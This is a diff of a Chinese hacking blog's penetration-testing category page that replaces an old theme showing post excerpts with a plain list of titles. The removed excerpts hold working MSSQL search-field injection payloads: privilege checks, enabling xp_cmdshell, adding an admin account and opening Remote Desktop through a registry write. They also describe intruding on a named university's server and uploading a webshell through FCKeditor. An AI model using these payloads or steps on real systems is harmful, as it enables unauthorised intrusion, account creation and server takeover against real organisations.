@@ -1,283 +1,270 @@
-<!DOCTYPE html>
-<html>
 
+  <!DOCTYPE HTML>
+<html  xmlns:wb="http://open.weibo.com/wb">
 <head>
-  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-  <title>Category: 渗透测试 | Blog of Secer</title>
-  <meta name="description" content="" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="MobileOptimized" content="320" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
-  <link rel="stylesheet" type="text/css" href="/css/style.css" />
-  <meta name="generator" content="Blog of Secer">
-
+  <meta charset="UTF-8">
   
-  
-  
-
-  
+    <title>Category: 渗透测试 | Blog of Secer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="Secer">
+    
+    <meta name="description" content="记录互联网安全历程与个人成长经历">
+    
+    
+    
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="333" />
+    <meta name="twitter:title" content="Category: 渗透测试 | Blog of Secer" />
+      
+    
+    
+    <link rel="alternate" href="atom.xml" title="Blog of Secer" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/pacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
 </head>
 
-<!--
-<body class="home-template">
--->
-<body class="home-template">
-<div id="perspective" class="perspective effect-movedown">
-  <div class="container">
-    <!-- wrapper -->
-    <div class="wrapper">
+    <body>
+      <header>
+        <div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Blog of Secer">Blog of Secer</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">首页</a></li>
+					
+						<li><a href="/archives">文章</a></li>
+					
+						<li><a href="/about">关于</a></li>
+					
+						<li><a href="/atom.xml">RSS订阅</a></li>
+					
+					<li>
+					
+					<form class="search" action="/search/index.html" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="30" placeholder="Search" />
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
 
-      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
-    <div class="vertical">
-        <div class="site-head-content inner">
-             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
-            <h1 class="blog-title">Blog of Secer</h1>
-            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
-        </div>
-    </div>
-</header>
+      </header>
+      <div id="container">
+        
 
-      
-<main class="content" role="main">
+<div class="archive-title" >
+  <h2 class="category-icon">渗透测试</h2>
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-21T14:30:58.000Z" itemprop="datePublished">
-          2012-06-21
-      </time>
-    
-    
-    | 
-    <a href='/tag/注入/'>注入</a>,
-    
-    <a href='/tag/注入漏洞/'>注入漏洞</a>,
-    
-    <a href='/tag/搜索型注入/'>搜索型注入</a>,
-    
-    <a href='/tag/手工注入/'>手工注入</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/584.seo/">搜索型注入漏洞手工注入过程</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>原文：<a href="http://www.90sec.org/docs/upload/day_120614/201206141204203053.txt">http://www.90sec.org/docs/upload/day_120614/201206141204203053.txt</a></p>  <p>本人是小菜，水平有限，但是为了论坛做贡献，还是自己写点原创的东西出来吧。希望大牛看了别笑就好了。。。。   <br />==================================================    <br />前段时间朋友丢了一个站过来，说是他们学校的。叫我帮忙检测下。    <br />于是看了下。用扫描器扫了下，没有啥可以上传利用的，发现后台，默认和万能密码无效，    <br />无注入点，手工和工具试过了，防注入，COOKIES注入也不行。找不到程序源码，没办法分析。旁注 ？    <br />整站是独立服务器，就一个站，旁注也没办法。难到要C段？好麻烦哦。丢给群里一些大牛看看，    <br />都说搞不定（应该是没认真看吧。），我大受打击，但是我不放弃，再去看看先。    <br />于是，发现了一个搜索框，直觉告诉我，这就是突破点，果然….. </p>  <p>前段时间的事情了，没办法截图。   <br />整个过程做了简单的笔记，和搜集了一些手工注入的代码。凑合着看吧。 </p>  <p>首先，简单的判断搜索型注入漏洞存在不存在的办法是先搜索，如果出错，说明90%存在这个漏洞。 </p>  <p>a%’ and 1=1– 正常   <br />a%’ and 1=2– 错误 </p>  <p>有注入 </p>  <p>由于网站过滤了 ‘ 等等的。所以工具不行，要手工了。累人啊~~~ </p>  <p>判断权限   <br />a%’ and (select is_member(‘dbo’))=1–&#160;&#160;&#160; 返回正常则 sa    <br />a%’ and (select is_member(‘db_owner’))=1–&#160;&#160; 返回正常则 DB    <br />都不是那就只有一种可能啦，public，权限貌似很小。 </p>  <p>也可以用另一种命令来判断权限   <br />a%’ and 1=(Select IS_SRVROLEMEMBER(‘sysadmin’));– sa    <br />a%’ and 1=(Select IS_MEMBER(‘db_owner’));– DB    <br />================================================================    <br />sa 的方法。直接建立系统帐号密码。登陆3389. </p>  <p>命令是    <br />a%’;exec master..xp_cmdshell&quot;net user admins 123456 /add&quot;– </p>  <p>如果 ‘xp_cmdshell’ 被关闭了。就来开启他。   <br />EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;reconfigure    <br />最后这个为1是开启.为0是关闭.    <br />a%’ ;EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXECsp_configure ‘xp_cmdshell’, 1;RECONFIGURE– </p>  <p>如果不开3389 </p>  <p>下面的命令。。 </p>  <p>a%’;exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEM\CurrentControlSet\Control\Terminal Server’,’fDenyTSConnections’,’REG_DWORD’,0;– </p>
-      
-      </p>
-      
-      <p>
-          <a href="/584.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+</div>
+<div id="main" class="archive-part clearfix">
+  <div id="archive-page">
+
+  <section class="post" itemscope itemprop="blogPost">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-21T12:29:20.000Z" itemprop="datePublished">
-          2012-06-21
-      </time>
-    
-    
-    | 
-    <a href='/tag/渗透/'>渗透</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/572.seo/">渗透一站全过程</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>目标的环境：   <br />目测 2003+iis6+asp.net+mssql&#160; 但是这个网站程序应该是使用的某个asp.net+soap开发的，至少出现漏洞的地方是。    <br /><b>一</b><b>.Web</b><b>站点的渗透</b>    <br />这次渗透并未使用任何扫描嗅探工具去探测目标完全使用手工检查的,经过一系列的测试后在网页源代码里面发现了一个比较有意思的链接。    <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/4cca5dc413a9_3F08/clip_image001.jpg" width="558" height="238" />    <br />上图中用篮筐拉出来的地址，引起了我的注意。根据名字这应该是用于上传文件的。    <br />访问这个链接后就证实了我的猜想</p>
-      
-      </p>
-      
-      <p>
-          <a href="/572.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <a href="/584.seo/" title="搜索型注入漏洞手工注入过程" itemprop="url">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-21T12:12:12.000Z" itemprop="datePublished">
-          2012-06-21
-      </time>
+    <h1 itemprop="name">搜索型注入漏洞手工注入过程</h1>
     
-    
-    | 
-    <a href='/tag/内网渗透/'>内网渗透</a>,
-    
-    <a href='/tag/3389/'>3389</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/566.seo/">小记一次渗透过程：一台工作站后面的大型内网</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>小记一次渗透过程：一台工作站后面的大型内网</p>  <p>作者：本地牛   <br /><a href="http://niuzu.blog.51cto.com/">http://niuzu.blog.51cto.com/</a></p>  <p>微博：</p>  <p><a href="http://weibo.com/2052543207/profile/">http://weibo.com/2052543207/profile/</a></p>  <p>域服务器的作用</p>  <p>1.安全集中管理 统一安全策略   <br />2.软件集中管理 按照公司要求限定所有机器只能运行必需的办公软件。    <br />3.环境集中管理 利用AD可以统一客户端桌面,IE,TCP/IP等设置    <br />4.活动目录是企业基础架构的根本，为公司整体统一管理做基础 其它isa,exchange,防病毒服务器，补丁分发服务器，文件服务器等服务依赖于域服务器。    <br />域控制器（Domain Controller，简写为DC）”</p>  <p>过程如下：</p>  <p>2天前对一台WIN2003主机做<a href="http://ha.cker.in/tag/oracle" target="_blank">ORACLE</a>安全测试，然后装了<a href="http://ha.cker.in" target="_blank">3389</a>登陆记录软件。    <br />然后昨天登陆看看此机的数据库设置情况时发现此机其实是DC下属的一台工作站</p>  <p><a href="http://www.2cto.com/uploadfile/2012/0225/20120225013116618.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/75559879257e_3AC6/clip_image001.jpg" width="423" height="316" /></a></p>  <p>远程桌面登陆后查看电脑名称获得DC域名。</p>  <p><a href="http://www.2cto.com/uploadfile/2012/0225/20120225013125220.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/75559879257e_3AC6/clip_image002.jpg" width="449" height="498" /></a></p>
-      
-      </p>
-      
-      <p>
-          <a href="/566.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <time datetime="2012-06-21T14:30:58.000Z" itemprop="datePublished">2012-06-21</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-21T11:12:24.000Z" itemprop="datePublished">
-          2012-06-21
-      </time>
-    
-    
-    | 
-    <a href='/tag/某某网络渗透测试报告/'>某某网络渗透测试报告</a>,
-    
-    <a href='/tag/渗透测试报告/'>渗透测试报告</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/562.seo/">渗透测试报告</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p><b>某某网络渗透测试报告</b><b></b></p>  <p>目录   <br />0x1概述    <br />1.1&#160;&#160;&#160;&#160;&#160;&#160;&#160; 渗透范围    <br />1.2&#160;&#160;&#160;&#160;&#160;&#160;&#160; 渗透测试主要内容    <br />0x2 脆弱性分析方法    <br />0x3 渗透测试过程描述    <br />3.1&#160;&#160;&#160;&#160;&#160;&#160;&#160; 遍历目录测试    <br />3.2&#160;&#160;&#160;&#160;&#160;&#160;&#160; 弱口令测试    <br />3.3&#160;&#160;&#160;&#160;&#160;&#160;&#160; Sql注入测试    <br />3.4&#160;&#160;&#160;&#160;&#160;&#160;&#160; 内网渗透    <br />3.5&#160;&#160;&#160;&#160;&#160;&#160;&#160; 内网嗅探    <br />0x4 分析结果与建议</p>  <p>   <br />0x1 概述    <br />某时段接到xx网络公司授权对该公司网络进行模拟黑客攻击渗透,在xx年xx月xx日-xx年xx月xx日.对xx网络公司的外网服务器和内网集群精心全面脆弱性黑盒测试.完成测试得到此份网络渗透测试报告。    <br />1.1&#160;&#160;&#160;&#160;&#160;&#160;&#160; 渗透范围    <br />此次渗透测试主要包括对象：    <br />某网络公司外网web服务器.企业邮局服务器,核心商业数据服务器和内网办公网络系统。    <br />1.2&#160;&#160;&#160;&#160;&#160;&#160;&#160; 渗透测试主要内容    <br />本次渗透中，主要对某网络公司web服务器,邮件服务器进行遍历目录,用户弱口令猜解，sql注入漏洞，数据库挖掘，内网嗅探,以及域服务器安全等几个方面进行渗透测试。</p>  <p>   <br />0x2 脆弱性分析方法    <br />按照国家工信部is900标准,采用行业内认可的测试软件和技术人员手工操作模拟渗透。</p>  <p>   <br />0x3 渗透测试过程描述    <br />3.1 遍历目录测试    <br />使用载入国内外3万多目录字典的wwwscan对web和邮件服务器进行目录探测。得到探测结果。主站不存在遍历目录和敏感目录的情况。但是同服务器站点存在edit编辑器路径。该编辑器版本过低。存在严重漏洞。如图    <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/e91cad0821e6_2CEB/clip_image001.jpg" width="508" height="221" /></p>
-      
-      </p>
-      
-      <p>
-          <a href="/562.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <a href="/572.seo/" title="渗透一站全过程" itemprop="url">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-21T10:23:56.000Z" itemprop="datePublished">
-          2012-06-21
-      </time>
+    <h1 itemprop="name">渗透一站全过程</h1>
     
-    
-    | 
-    <a href='/tag/N点虚拟主机提权实例/'>N点虚拟主机提权实例</a>,
-    
-    <a href='/tag/fckeditor/'>fckeditor</a>,
-    
-    <a href='/tag/IISPY/'>IISPY</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/554.seo/">N点虚拟主机提权实例</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>首先说一下，这台服务器是我日错了。本来不是这个服务器，拿到webshell以后发现不是我要找的服务器，然后。。   <br />不管怎么说，先提权再说，谁会嫌自己服务器多(其实我真的嫌手上多的，谁来帮我打理维护啊。。。好吧，我说笑的)。    <br />作者：YoCo Smart    <br />来自：<a href="http://blackbap.org/">Silic Group Hacker Army</a>    <br /><a href="http://blackbap.org/">http://BlackBap.Org</a>    <br />一开始看的时候我就知道是一台虚拟主机，而且应该支持php,asp,aspx    <br />这个站首先我找到了一个FCKeditor，这个FCK编辑器没有FileManager文件夹，于是我构造了/fckeditor/editor/fckeditor.html?toolbar=default这个路径    <br />点击浏览服务器出现：/admin/<a href="http://ha.cker.in/tag/fckeditor" target="_blank">fckeditor</a>/dialog/select_images.php?f=form1.imgsrc&amp;imgstick=big    <br />这样一个地址，居然不是browser，估计版本更高级了吧    <br />好在服务器是IIS，比较省力的就传上去IIS解析漏洞的<a href="http://ha.cker.in/tag/webshell" target="_blank">webshell</a>了（这个版本的FCK创建文件夹时禁止输入点“.”，但是可以抓包或者本地表单POST创建，方法很多）    <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/N_2187/clip_image002.png" width="604" height="461" />    <br />目录不出意外的没有设置严，Porgrams目录可读，而且MYSQL的data目录也在里面（MySQL的data目录有可能在其他目录，比方说某磁盘根目录，Documents目录或者2008的Users目录等）    <br />D:/Program Files/MySQL/MySQL Server 5.0/data/mysql/user.MYD    <br />这个文件读出来却是这样的：</p>
-      
-      </p>
-      
-      <p>
-          <a href="/554.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <time datetime="2012-06-21T12:29:20.000Z" itemprop="datePublished">2012-06-21</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-21T10:16:39.000Z" itemprop="datePublished">
-          2012-06-21
-      </time>
-    
-    
-    | 
-    <a href='/tag/入侵/'>入侵</a>,
-    
-    <a href='/tag/中央民族大学/'>中央民族大学</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/551.seo/">入侵中央民族大学主站服务器</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>作者：晓华[岁月联盟]</p>  <p>此文谨献给我亲爱的爸爸妈妈和热情的黑手读者！</p>  <p>来到大学快二个月了，感觉很好，认识了很多朋友，在这里结识了我的好兄弟夜枫。我学的是信息安全专业，感觉国内对这块投入很少，再加上有些网络系统管理员的安全意识比较低，总是认为我安装了最厉害的杀毒软件和严密的防火墙，并且把它们升级到最新版本，天天自动升级病毒库。恶意攻击可以避免，其实不是这样的。网络技术飞速的发展，网络安全技术和黑客攻击技术也在同步的发展，都是相互推动的，在做好了完整的安全防护外，我们还需要对系统的关键部分进行模拟的入侵测试，以找出系统存在的安全隐患并加以修复。人的意识最重要，别总是把希望寄托与强悍的杀毒软件和坚固的防火墙。</p>  <p>下面我将给新手朋友介绍下MYSQL5+PHP环境下的入侵技术。目标就拿中央民族大学主站作为入侵演示，之前朋友叫我检测下该站安全。现在用PHP做站的越来越多，PHP运行效率高，消耗系统资源比较低。再加上MYSQL是免费的数据库。PHP+MYSQL组合是黄金搭档，它们的安全问题也尤为重要。下面就简单介绍下基本入侵思路和MYSQL5注射的技巧。</p>  <p>既然是安全检测，肯定要用到网络安全扫描器进行系统信息收集。通过PING命令很轻松的得到该站IP地址，扫描软件我就用尖刀端口扫描器，速度快的它可以提高我们的入侵效率。扫描结果如下图1：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/663349f87027_1FC5/clip_image002.jpg" width="686" height="381" /></p>  <p>目标机器只对外开放了三个端口。溢出漏洞就别想了，这里就只留给我们二个端口可以突破，暴力破解终端密码？貌似我还没见人那样做哈。我们还是选择直接从80端口渗透进去吧！不知道目标站点的脚本程序安全怎么样。打开主站，是PHP的页面。后台数据库很可能是MYSQL，主机限制了3306端口对外开放，管理员对敏感端口的基本安全意识还是有的嘛！</p>
-      
-      </p>
-      
-      <p>
-          <a href="/551.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <a href="/566.seo/" title="小记一次渗透过程：一台工作站后面的大型内网" itemprop="url">
   
-  <nav class="pagination" role="pagination">
-    <a class="newer-posts" href="/category/渗透测试/page/11/">← Newer Posts</a>
-    <span class="page-number">Page 12 of 16</span>
-    <a class="older-posts" href="/category/渗透测试/page/13/">Older Posts →</a>
+    <h1 itemprop="name">小记一次渗透过程：一台工作站后面的大型内网</h1>
+    
+    <time datetime="2012-06-21T12:12:12.000Z" itemprop="datePublished">2012-06-21</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
+  
+    <a href="/562.seo/" title="渗透测试报告" itemprop="url">
+  
+    <h1 itemprop="name">渗透测试报告</h1>
+    
+    <time datetime="2012-06-21T11:12:24.000Z" itemprop="datePublished">2012-06-21</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
+  
+    <a href="/554.seo/" title="N点虚拟主机提权实例" itemprop="url">
+  
+    <h1 itemprop="name">N点虚拟主机提权实例</h1>
+    
+    <time datetime="2012-06-21T10:23:56.000Z" itemprop="datePublished">2012-06-21</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
+  
+    <a href="/551.seo/" title="入侵中央民族大学主站服务器" itemprop="url">
+  
+    <h1 itemprop="name">入侵中央民族大学主站服务器</h1>
+    
+    <time datetime="2012-06-21T10:16:39.000Z" itemprop="datePublished">2012-06-21</time>
+  </a>
+</section>
+
+
+  <nav id="page-nav" class="clearfix archive-nav">
+    <a class="extend prev" rel="prev" href="/category/渗透测试/page/11/">&laquo; 上一页</a><a class="page-number" href="/category/渗透测试/">1</a><span class="space">&hellip;</span><a class="page-number" href="/category/渗透测试/page/10/">10</a><a class="page-number" href="/category/渗透测试/page/11/">11</a><span class="page-number current">12</span><a class="page-number" href="/category/渗透测试/page/13/">13</a><a class="page-number" href="/category/渗透测试/page/14/">14</a><span class="space">&hellip;</span><a class="page-number" href="/category/渗透测试/page/16/">16</a><a class="extend next" rel="next" href="/category/渗透测试/page/13/">下一页 &raquo;</a>
   </nav>
-</main>
 
-
-      
-<footer class="site-footer">
-  
-  <div class="inner">
-     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
-     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
   </div>
+</div>
+
+      </div>
+      <footer><div id="footer" >
+	
+	
+	<section class="info">
+		<p> 没有礁石，就没有美丽的浪花；没有挫折，就没有壮丽的人生！ <br/>
+			再长的路，一步步也能走完，再短的路，不迈开双脚也无法到达，平凡的脚步也可以走完伟大的行程！</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/111" target="_blank" title="weibo"></a>
+		
+		
+		<a href="https://twitter.com/333" target="_blank" title="twitter"></a>
+		
+		
+		<a href="https://github.com/333" target="_blank" title="github"></a>
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="pacman">pacman</a> © 2016 
+		
+		<a href="http://ha.cker.in" target="_blank" title="Secer">Secer</a>
+		
+		</p>
+</div>
 </footer>
+      <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
 
-      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
-<script type="text/javascript" src="/js/index.js"></script>
-<script type="text/javascript" src="/js/menu.js"></script>
 
 
 
 
 
-  </div>
+
+
+
+
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F77edef7e6931022edbd2322ec66456e1' type='text/javascript'%3E%3C/script%3E"));
+</script>
+
+<div id="totop" style="position:fixed;bottom:150px;right:50px;cursor: pointer;">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
 </div>
+<script type="text/javascript">
+	(function($) { 
+		// When to show the scroll link
+		// higher number = scroll link appears further down the page   
+		var upperLimit = 300;
+		
+		// Our scroll link element
+		var scrollElem = $('#totop');
+	   
+		// Scroll to top speed
+		var scrollSpeed = 800;
+	   
+		// Show and hide the scroll to top link based on scroll position   
+		scrollElem.hide();
+		$(window).scroll(function () {            
+			var scrollTop = $(document).scrollTop();       
+			if ( scrollTop > upperLimit ) {
+				$(scrollElem).stop().fadeTo(300, 1); // fade back in           
+			}else{       
+				$(scrollElem).stop().fadeTo(300, 0); // fade out
+			}
+		});
+		// Scroll to top animation on click
+		$(scrollElem).click(function(){
+			$('html, body').animate({scrollTop:0}, scrollSpeed); return false;
+		});
+	})(jQuery);
+</script>
 
-<nav  class="outer-nav top horizontal">
 
-          <a class="icon-home"  href="/"><span>Home</span></a>
+    </body>
+   </html>
 
-          <a class="icon-news"  href="/archives"><span>Archive</span></a>
-
-          <a class="icon-image"  href="/images"><span>Images</span></a>
-
-          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
-
-          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
-
-          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
-
-</nav>
-
-</div>
-</body>
-</html>
